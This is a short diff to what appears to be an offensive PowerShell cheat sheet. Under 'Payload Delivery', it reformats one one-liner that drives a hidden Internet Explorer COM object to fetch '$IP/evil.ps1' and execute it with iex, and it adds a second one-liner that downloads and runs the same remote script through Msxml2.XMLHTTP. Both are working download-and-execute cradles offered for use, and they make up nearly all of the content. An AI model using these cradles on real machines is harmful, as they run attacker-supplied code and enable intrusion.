@@ -46,10 +46,12 @@ $classrev = ([regx]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) - 
 #### Payload Delivery
 __Com Object__
 ```powershell
-$x = New-Object -ComObject InternetExplorer.Application;$x.visible=$False;$x.navigate('$IP/evil.ps1');sleep 5;$r=$x.Document.body.innerHTML;$x.quit();iex $r
+$x=New-Object -ComObject InternetExplorer.Application;$x.visible=$False;$x.navigate('$IP/evil.ps1');sleep 5;$r=$x.Document.body.innerHTML;$x.quit();iex $r
 ```
-```powershel
+```powershell
+$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','$IP/evil.ps1',$false);$h.send();iex $h.responseText
 ```
+
 
 ---
 ### Offensive C\#
